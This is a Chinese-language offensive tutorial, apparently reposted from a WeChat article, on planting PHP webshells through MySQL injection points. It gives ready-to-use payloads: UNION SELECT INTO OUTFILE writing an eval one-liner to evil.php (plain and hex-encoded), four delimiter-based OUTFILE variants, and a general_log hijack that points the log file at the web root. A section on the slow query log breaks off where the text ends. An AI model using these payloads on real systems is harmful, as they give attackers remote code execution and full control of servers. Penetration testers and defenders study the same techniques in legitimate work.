bypass师傅：[MySQL注入点写入WebShell的几种方式](https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448905256&idx=1&sn=ac7a5a3c52f1ac7b30c82fbcb2e0e521&chksm=8b55c475bc224d63eaec9d84421bd67bd45a6098a016e751e49cd0e16cc51f53061dd8496ee3&mpshare=1&scene=1&srcid=&sharer_sharetime=1587001179548&sharer_shareid=a7d99c78943a626e64cade4860efb7d9#rd)

一个`MySQL`注入点写入`Webshell`，需要满足哪些条件呢？简单来说，需要了解secure_file_priv是否支持数据导出、还有当前数据库用户权限，当然，root用户数据库的全部权限，但写入Webshell 并不需要一定是`root`用户。

## 利用Union select 写入

这是最常见的写入方式，`union` 跟`select into outfile`，将一句话写入`evil.php`，仅适用于联合注入。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户File权限、获取物理路径。

```
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
```

## 利用分隔符写入

当`Mysql`注入点为盲注或报错，`Union select`写入的方式显然是利用不了的，那么可以通过分隔符写入。`SQLMAP`的 `--os-shell`命令，所采用的就是以下这种方式。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户`File`权限、获取物理路径。

```
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
```

同样的技巧，一共有四种形式：

```
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
```

## 利用log写入

新版本的`MySQL`设置了导出文件的路径，很难在获取`Webshell`过程中去修改配置文件，无法通过使用`select into outfile`来写入一句话。这时，我们可以通过修改`MySQL`的`log`文件来获取`Webshell`。

具体权限要求：数据库用户需具备`Super`和`File`服务器权限、获取物理路径。

```
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式
```

## 慢日志

MySQL的**慢查询日志**是MySQL提供的一种日志记录，**它用来记录在MySQL中响应时间超过阀值的语句**，具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。long_query_time的默认值为10，意思是运行10S以上的语句。使用set global slow_query_log=1开启了慢查询日志只对当前数据库生效，如果MySQL重启后则会失效。如果要永久生效，就必须修改配置文件my.cnf（其它系统变量也是如此）。